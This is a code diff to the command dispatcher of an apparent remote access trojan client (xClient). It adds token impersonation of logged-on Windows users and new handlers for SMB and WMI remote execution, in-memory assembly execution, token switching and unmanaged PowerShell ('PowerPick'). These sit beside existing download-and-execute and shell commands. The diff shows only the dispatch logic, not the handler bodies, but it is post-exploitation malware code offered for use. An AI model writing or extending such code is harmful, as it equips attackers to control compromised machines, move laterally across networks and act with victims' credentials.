@@ -1,6 +1,13 @@
-﻿using xClient.Core.Commands;
+﻿using System;
+using System.Security.Principal;
+using System.Collections.Generic;
+using xClient.Core.Commands;
+using xClient.Core.Data;
 using xClient.Core.Networking;
+using xClient.Core.Helper;
 using xClient.Core.ReverseProxy;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
 
 namespace xClient.Core.Packets
 {
@@ -8,8 +15,21 @@ namespace xClient.Core.Packets
     {
         public static void HandlePacket(Client client, IPacket packet)
         {
-            var type = packet.GetType();
+            bool rev2self = false;
+            if (CommandHandler.impersonate == true && !string.IsNullOrEmpty(CommandHandler.impersonatedUser))
+            {
+                try
+                {
+                    WindowsAPIHelper.ImpersonateLoggedOnUser(CommandHandler.impersonatedUsers[CommandHandler.impersonatedUser].DangerousGetHandle());
+                    rev2self = true;
+                }
+                catch (Exception e)
+                {
+                    return;
+                }
+            }
 
+            var type = packet.GetType();
             if (type == typeof(ServerPackets.DoDownloadAndExecute))
             {
                 CommandHandler.HandleDoDownloadAndExecute((ServerPackets.DoDownloadAndExecute)packet,
@@ -109,7 +129,18 @@ namespace xClient.Core.Packets
             }
             else if (type == typeof(ServerPackets.DoShellExecute))
             {
-                CommandHandler.HandleDoShellExecute((ServerPackets.DoShellExecute)packet, client);
+                //I don't think Process Impersonation is going to work the way this is executed. Going to try and create an alternative shell.
+                var choice = (ServerPackets.DoShellExecute)packet;
+
+                if (choice.impersonate)
+                {
+                    CommandHandler.HandleDoShellImpersonate((ServerPackets.DoShellExecute)packet, client);
+                }
+                else
+                {
+                    CommandHandler.HandleDoShellExecute((ServerPackets.DoShellExecute)packet, client);
+                }
+
             }
             else if (type == typeof(ServerPackets.DoPathRename))
             {
@@ -206,6 +237,36 @@ namespace xClient.Core.Packets
             else if (type == typeof(ServerPackets.GetStopChatAgent))
             {
                 CommandHandler.HandleGetStopChat((ServerPackets.GetStopChatAgent)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoSMBExec))
+            {
+                CommandHandler.HandleGetSMBExec((ServerPackets.DoSMBExec)packet,client);
+            }
+            else if (type == typeof(ServerPackets.DoWMIExec))
+            {
+                CommandHandler.HandleGetWMIExec((ServerPackets.DoWMIExec)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoExecuteAssembly))
+            {
+                CommandHandler.HandleDoExecuteAssembly((ServerPackets.DoExecuteAssembly)packet, client);
+            }
+            else if(type == typeof(ServerPackets.GetChangeToken))
+            {
+                CommandHandler.HandleDoChangeToken((ServerPackets.GetChangeToken)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoEnableImpersonation))
+            {
+                    CommandHandler.HandleDoEnableImpersonation((ServerPackets.DoEnableImpersonation)packet, client);
+            }
+            else if (type == typeof(ServerPackets.GetPowerPick))
+            {
+                CommandHandler.HandleGetPowerPick((ServerPackets.GetPowerPick)packet, client);
+                //Do Command
+            }
+
+            if (rev2self)
+            {
+                WindowsAPIHelper.RevertToSelf();
             }
         }
     }
